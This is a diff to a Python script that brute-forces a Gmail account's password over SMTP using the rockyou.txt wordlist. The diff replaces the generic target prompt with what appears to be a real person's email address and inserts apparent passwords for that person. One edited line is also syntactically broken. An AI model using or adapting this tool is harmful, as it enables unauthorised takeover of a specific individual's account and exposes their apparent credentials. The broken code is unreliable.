@@ -27,7 +27,7 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = input("Enter The Target Gmail Adress => ")
+user = input("jodipriddy0831@gmail.com=> ")
 
 print("\n")
 
@@ -37,8 +37,8 @@ if pwd=='0':
     passswfile="rockyou.txt"
 
 elif pwd=='2':
-    print("\n")
-    passswfile = input("Name The File Path (For Password List) => ")
+    print("\")
+    passswfile = input("Mimi password(hannah318 Hannah318$) => ")
 
 else:
     print("\n")
